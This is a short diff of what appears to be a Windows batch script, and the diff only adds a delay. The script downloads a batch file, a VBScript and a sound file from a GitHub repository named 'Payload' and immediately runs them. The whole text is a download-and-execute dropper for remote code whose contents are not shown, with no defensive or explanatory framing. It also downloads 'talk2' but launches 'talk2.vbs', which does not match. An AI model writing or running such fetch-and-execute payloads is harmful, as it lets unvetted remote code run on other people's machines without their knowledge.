@@ -1,6 +1,7 @@
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat
+timeout 5 > nul
 start startexc.bat
 start sound.wav
 start talk2.vbs
